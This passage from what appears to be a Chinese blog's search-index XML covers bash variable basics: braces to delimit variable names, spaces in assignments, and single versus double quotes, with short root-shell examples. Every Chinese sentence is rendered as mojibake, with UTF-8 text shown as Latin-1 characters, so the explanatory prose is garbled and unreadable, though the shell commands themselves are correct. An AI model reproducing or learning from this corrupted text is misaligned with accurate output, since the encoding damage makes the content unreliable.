class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆæ‰§è¡Œçš„å‘½ä»¤æ˜¯ç”±å½“å‰shellåˆ›å»ºçš„å­shellæ‰§è¡Œçš„ã€‚</p></blockquote><p>åŠ ä¸Š{}ç”¨äºåŒºåˆ†å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å› ä¸ºæ‰¾ä¸åˆ°å˜é‡abï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©º</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><p>å½“å˜é‡å€¼å«æœ‰ç©ºæ ¼æ—¶ï¼Œå°±è¦åŠ ä¸Šå¼•å·ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>å•å¼•å·ï¼šä¸èƒ½è§£æå˜é‡ï¼Œåªä¼šåŸæ ·è¾“å‡º</p><p>åŒå¼•å·ï¼šèƒ½å¤Ÿè§£æå˜é‡</p><ul><li>è·å–å­—ç¬¦ä¸²é•¿åº¦   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
